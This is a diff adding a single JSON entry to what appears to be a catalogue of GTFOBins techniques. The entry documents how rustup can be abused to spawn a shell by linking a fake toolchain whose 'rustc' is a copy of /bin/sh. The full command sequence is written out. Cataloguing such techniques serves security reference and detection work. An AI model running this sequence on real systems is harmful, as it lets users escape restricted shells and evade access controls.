@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-rustup-shell",
+  "name": "GTFOBins · rustup (shell)",
+  "command": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\ncp /bin/sh /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc",
+  "description": "Use rustup to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "rustup",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/rustup/#shell",
+  "upstream_id": "rustup/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/rustup/"
+    }
+  ]
+}
